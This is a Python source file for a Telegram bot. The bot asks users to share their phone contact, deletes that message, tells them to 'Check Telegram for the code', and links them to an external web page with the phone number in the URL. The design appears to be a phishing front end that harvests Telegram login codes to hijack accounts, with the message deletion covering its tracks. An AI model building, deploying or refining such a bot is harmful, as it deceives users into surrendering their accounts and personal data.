import os
import urllib.parse
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

WEB_URL = "web-production-11880.up.railway.app"  # UPDATE AFTER WEB DEPLOY

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome! Share your phone number to continue:",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("Share My Contact", request_contact=True)]],
            one_time_keyboard=True, resize_keyboard=True
        )
    )

async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    try:
        await update.message.delete()
    except:
        pass

    url = f"{WEB_URL}/?phone={urllib.parse.quote(phone)}"
    button = InlineKeyboardMarkup([[InlineKeyboardButton("Continue", url=url)]])

    await update.message.reply_text(
        "Phone received!\nCheck Telegram for the code.\n\nClick to continue:",
        reply_markup=button
    )

app = Application.builder().token(os.getenv("BOT_TOKEN")).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.CONTACT, phone))
app.run_polling()
